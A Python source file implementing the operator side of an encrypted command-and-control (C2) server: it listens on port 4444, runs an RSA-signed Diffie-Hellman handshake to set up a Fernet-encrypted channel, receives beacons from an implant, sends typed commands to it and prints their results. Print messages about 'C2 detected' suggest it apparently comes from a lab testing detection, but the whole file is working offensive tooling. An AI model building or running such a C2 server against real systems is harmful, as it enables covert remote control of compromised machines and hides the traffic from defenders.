import socket
import base64
import json
import time
import uuid

from cryptography.hazmat.primitives.asymmetric import padding, dh
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.fernet import Fernet

# ================= RSA PRIVATE KEY LOAD =================
with open("server_private.pem", "rb") as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None
    )

# ================= DH PARAMETERS =================
parameters = dh.generate_parameters(generator=2, key_size=2048)

HOST = "192.168.100.1"
PORT = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print("Server listening...")

conn, addr = server.accept()
print(f"Connected from {addr}")

# ================= HANDSHAKE =================
print("Performing secure handshake...")

dh_private = parameters.generate_private_key()
dh_public = dh_private.public_key()

dh_public_bytes = dh_public.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

signature = private_key.sign(
    dh_public_bytes,
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)

conn.send(len(dh_public_bytes).to_bytes(4, 'big'))
conn.send(dh_public_bytes)

conn.send(len(signature).to_bytes(4, 'big'))
conn.send(signature)

client_len = int.from_bytes(conn.recv(4), 'big')
client_bytes = conn.recv(client_len)

client_public = serialization.load_pem_public_key(client_bytes)

shared_key = dh_private.exchange(client_public)

derived_key = HKDF(
    algorithm=hashes.SHA256(),
    length=32,
    salt=None,
    info=b'handshake data'
).derive(shared_key)

fernet_key = base64.urlsafe_b64encode(derived_key)
cipher = Fernet(fernet_key)

print("Secure channel established!")

# ================= HELPERS =================

def create_message(msg_type, data):
    return json.dumps({
        "ts": time.time(),
        "nonce": str(uuid.uuid4()),
        "type": msg_type,
        "data": data
    }).encode()

def encrypt_message(message_bytes):
    return cipher.encrypt(message_bytes)

def decrypt_message(cipher_bytes):
    return json.loads(cipher.decrypt(cipher_bytes).decode())

# ================= COMMUNICATION =================

while True:
    try:
        data = conn.recv(4096)

        # Only treat as disconnect if recv returns empty AFTER active connection
        if not data:
            print("Client disconnected!")
            break

        parsed = decrypt_message(data)

        if parsed["type"] == "BEACON":
            print("[BEACON]:", parsed["data"])

            cmd = input("Enter command: ")

            try:
                msg = create_message("CMD", cmd)
                conn.send(encrypt_message(msg))
            except Exception:
                print("Client blocked connection (C2 detected) !!!")
                break

            if cmd.lower() == "exit":
                break

        elif parsed["type"] == "RESULT":
            print("[RESULT]:\n", parsed["data"])

    except Exception as e:
        if "Connection reset by peer" in str(e) or "Broken pipe" in str(e):
            print("Client blocked connection (C2 detected) !!!")
        else:
            print("Error:", e)
        break

conn.close()
